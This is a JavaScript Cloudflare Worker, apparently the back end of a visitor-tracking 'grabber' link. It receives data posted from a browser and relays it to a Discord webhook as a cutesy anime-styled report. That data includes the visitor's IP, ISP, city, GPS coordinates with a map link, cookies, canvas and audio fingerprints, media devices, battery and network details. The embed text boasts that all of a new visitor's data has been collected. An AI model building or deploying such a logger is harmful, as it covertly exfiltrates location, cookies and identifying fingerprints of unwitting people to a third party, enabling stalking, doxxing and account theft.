/**
 * Cloudflare Worker — Isekai Info-chan ✨
 */

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

function s(v, max = 200) {
  if (v == null || v === "" || v === "null" || v === undefined) return "—";
  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").slice(0, max);
}

function bool(v) {
  if (v === true || v === "true") return "✅";
  if (v === false || v === "false") return "❌";
  return "—";
}

function arr(v) {
  if (!v || !Array.isArray(v) || v.length === 0) return "—";
  return v.join(", ").slice(0, 200) || "—";
}

function waktuWIB() {
  try {
    return new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  } catch (_) { return new Date().toISOString(); }
}

function parseBrands(brandsJson) {
  try {
    const arr = JSON.parse(brandsJson);
    return arr.map(b => `${b.brand} ${b.version}`).join(", ");
  } catch (_) { return s(brandsJson); }
}

function buildEmbed(data) {
  const gpsValue = (data.lat && data.lon)
    ? `[🗺️ Lihat Peta](https://maps.google.com/?q=${data.lat},${data.lon})\nLat: \`${data.lat}\`, Lon: \`${data.lon}\``
    : "*uwu~ lokasi GPS tidak ketemu~ (◡︿◡✿)*";

  const urlValue = data.url
    ? `[🔗 Klik di sini nyaa~](${data.url})\n\`${s(data.url, 200)}\``
    : "—";

  const referrerValue = data.referrer
    ? `[🌸 Dari sini~](${data.referrer})\n\`${s(data.referrer, 200)}\``
    : "*langsung dibuka nyaa~ (ﾉ◕ヮ◕)ﾉ*";

  const fields = [
    {
      name: "🔗 ✨ Link Yang Dibuka Onii-chan~",
      value: urlValue,
      inline: false
    },
    {
      name: "🌸 Datang Dari Mana Nyaa~",
      value: referrerValue,
      inline: false
    },
    {
      name: "🌐 IP & Lokasi Desu~",
      value: `📍 IP: \`${s(data.ip)}\`\n🏢 ISP: ${s(data.isp)}\n🏙️ Kota: ${s(data.city)}\n🗾 Region: ${s(data.region)}\n🌍 Negara: ${s(data.country)}\n🕵️ Proxy: ${bool(data.proxy)}\n☁️ Hosting: ${bool(data.hosting)}\n📡 ASN: ${s(data.asn)}`,
      inline: false
    },
    {
      name: "📡 GPS Nyaa~",
      value: gpsValue,
      inline: false
    },
    {
      name: "💻 Hardware-kun~",
      value: `⚙️ CPU: \`${s(data.hardwareConcurrency)} cores\`\n🧠 RAM: \`${s(data.deviceMemory)} GB\`\n🎮 GPU Vendor: ${s(data.vendor)}\n🖥️ GPU Renderer: ${s(data.renderer)}\n🔷 WebGL Ver: ${s(data.version)}\n🚀 WebGPU: ${bool(data.webgpu)}\n👆 Touch Points: ${s(data.maxTouchPoints)}\n📳 Sensor: Accel:${s(data.accel)} Gyro:${s(data.gyro)} Mag:${s(data.mag)}`,
      inline: false
    },
    {
      name: "🖥️ Layar-chan Desu~",
      value: `📐 Resolusi: \`${s(data.width)}x${s(data.height)}\`\n📏 Avail: \`${s(data.availWidth)}x${s(data.availHeight)}\`\n🔍 Pixel Ratio: \`${s(data.pixelRatio)}\`\n🎨 Color Depth: \`${s(data.colorDepth)} bit\`\n🔄 Orientasi: ${s(data.orientation)} (${s(data.orientationAngle)}°)\n🪟 Inner: \`${s(data.innerWidth)}x${s(data.innerHeight)}\``,
      inline: false
    },
    {
      name: "📱 Platform & OS-kun~",
      value: `🖥️ Platform: ${s(data.platform)}\n📲 Mobile: ${bool(data.mobile)}\n📋 Model: ${s(data.model)}\n⚙️ Arch: ${s(data.architecture)}\n🔢 Bitness: ${s(data.bitness)}\n🏷️ UA Brands: ${data.brands ? parseBrands(data.brands) : "—"}`,
      inline: false
    },
    {
      name: "🔊 Audio & Canvas Fingerprint~",
      value: `🎵 Audio FP: \`${s(data.audioFingerprint, 80)}\`\n🎨 Canvas FP: \`${s(data.canvasFingerprint, 64)}\``,
      inline: false
    },
    {
      name: "💾 Storage Onii-chan~",
      value: `📦 LocalStorage: ${bool(data.localStorage)}\n📂 SessionStorage: ${bool(data.sessionStorage)}\n🗄️ IndexedDB: ${bool(data.indexedDB)}\n👷 Service Worker: ${bool(data.serviceWorker)}\n⚡ Cache API: ${bool(data.cacheAPI)}\n🍪 Cookies: ${s(data.cookies)}\n🚫 Do Not Track: ${s(data.doNotTrack)}\n✅ Cookie Enabled: ${bool(data.cookieEnabled)}`,
      inline: false
    },
    {
      name: "🎥 Media Devices-chan~",
      value: `🎤 Audio Input: ${arr(data.audioIn)}\n📷 Video Input: ${arr(data.videoIn)}\n🔈 Audio Output: ${arr(data.audioOut)}`,
      inline: false
    },
    {
      name: "🔋 Baterai Nyaa~",
      value: `⚡ Level: ${s(data.level)}\n🔌 Charging: ${bool(data.charging)}`,
      inline: false
    },
    {
      name: "🌐 Jaringan Desu~",
      value: `📶 Tipe: ${s(data.connectionType)}\n🚀 Effective: ${s(data.effectiveConnection)}\n⬇️ Downlink: ${s(data.downlink)} Mbps\n⏱️ RTT: ${s(data.rtt)} ms\n💡 Save Data: ${bool(data.saveData)}\n🌍 Online: ${bool(data.online)}`,
      inline: false
    },
    {
      name: "🌍 Locale Info-chan~",
      value: `🗣️ Bahasa: ${s(data.language)}\n📚 Languages: ${s(data.languages)}\n⏰ Timezone: ${s(data.timezone)}\n💴 Currency: ${s(data.currency)}\n📅 Calendar: ${s(data.calendar)}\n🔢 Numbering: ${s(data.numberingSystem)}`,
      inline: false
    },
    {
      name: "🧩 Fitur Browser-kun~",
      value: `🔷 WebGL2: ${bool(data.webgl2)}\n🚀 WebGPU: ${bool(data.webgpu)}\n📹 WebRTC: ${bool(data.webrtc)}\n📊 CSS Grid: ${bool(data.cssGrid)}\n📐 Flexbox: ${bool(data.flexbox)}\n📡 Fetch API: ${bool(data.fetchAPI)}\n🤝 Promise: ${bool(data.promise)}`,
      inline: false
    },
    {
      name: "🔌 Plugins & MIME Nyaa~",
      value: `🧩 Plugins: ${s(data.plugins) || "—"}\n📄 MIME Types: ${s(data.mimeTypes) || "—"}`,
      inline: false
    },
    {
      name: "📜 User Agent Desu~",
      value: `\`\`\`${s(data.userAgent, 200)}\`\`\``,
      inline: false
    },
  ];

  return {
    color: 0xFF85C1,
    author: {
      name: "✨ Isekai Info-chan melaporkan~ (｡♥‿♥｡)",
      icon_url: "https://img.icons8.com/color/96/kawaii-gummy-bear.png"
    },
    title: "🌸 Laporan Pengunjung Baru Nyaa~ 🌸",
    description: `> *Ara ara~ ada tamu baru masuk ke dunia isekai! Info-chan sudah mengumpulkan semua datanya desu~ (≧◡≦) ✨*`,
    fields,
    footer: {
      text: `🎀 Isekai Info-chan Engine v100 ✨ • ${waktuWIB()} • がんばってね！`
    },
    timestamp: new Date().toISOString()
  };
}

export default {
  async fetch(request, env) {
    if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS });
    if (request.method !== "POST") return new Response("Not Found", { status: 404, headers: CORS });

    let data;
    try { data = await request.json(); } catch { return new Response("Bad JSON", { status: 400, headers: CORS }); }

    const webhook = env.DISCORD_WEBHOOK_URL;
    if (!webhook) return new Response("OK", { status: 200, headers: CORS });

    try {
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "Isekai Info-chan ✨",
          avatar_url: "https://img.icons8.com/color/96/kawaii-gummy-bear.png",
          embeds: [buildEmbed(data)]
        })
      });
    } catch (e) { console.error(e); }

    return new Response("OK", { status: 200, headers: CORS });
  },
};
